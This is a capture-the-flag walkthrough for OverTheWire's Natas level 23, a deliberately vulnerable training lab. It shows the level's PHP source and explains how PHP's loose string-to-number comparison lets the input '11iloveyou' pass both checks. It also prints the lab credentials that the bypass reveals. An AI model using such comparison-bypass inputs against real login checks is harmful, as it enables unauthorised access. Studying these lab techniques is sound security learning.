# Natas Level 23

> Username: natas23

> Password: CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5

> URL: http://natas23.natas.labs.overthewire.org

## Solution

Entering the URL, we found a password input. Let's view the source code to find the weakness.

```php
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas24 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>  
```

The webpage will show us the password if two conditions are met.

```php
if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 ))
```

The PHP **`strstr()`** function searches for the first occurrence of a string inside another string and returns that part of the string.

So if you must place a number larger than `10` at the very beginning of the string, immediately followed by the text `iloveyou`, both conditions evaluate to `true`.

```text
http://natas23.natas.labs.overthewire.org/?passwd=11iloveyou
```

`strstr()` evaluation: It successfully finds `iloveyou` inside `11iloveyou`, which returns `iloveyou` (a truthy value).
`> 10` evaluation: PHP looks at `11iloveyou`, extracts the leading numeric part `11`, discards the rest of the string, and evaluates `11 > 10`, which is true.

```text
The credentials for the next level are:
Username: natas24 Password: shlL4BvOtawNCd81dwdKRHFzmTEjYYQX
```

```text
shlL4BvOtawNCd81dwdKRHFzmTEjYYQX
```

